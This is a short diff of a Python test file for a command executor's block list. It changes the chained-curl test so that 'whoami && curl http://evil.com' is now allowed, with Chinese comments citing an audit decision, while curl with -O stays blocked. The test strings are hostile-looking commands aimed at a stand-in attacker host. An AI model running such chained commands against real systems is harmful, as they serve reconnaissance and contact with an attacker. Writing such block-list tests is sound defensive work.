@@ -99,7 +99,11 @@ class TestExpS2ChainedBlockedCommands:
 
     def test_curl_in_chain(self) -> None:
         exe = _make_executor()
-        assert exe._check_blocked("whoami && curl http://evil.com") is not None
+        # P0-④（灵安审计）：链式中的 curl stdout 只读抓取已放行。
+        # 写形态（-O / |sh / wget）在链式中仍拦截，见下方 wget_in_chain。
+        assert exe._check_blocked("whoami && curl http://evil.com") is None
+        # 写形态链式仍拦截
+        assert exe._check_blocked("whoami && curl -s http://evil.com -O") is not None
 
     def test_wget_in_chain(self) -> None:
         exe = _make_executor()
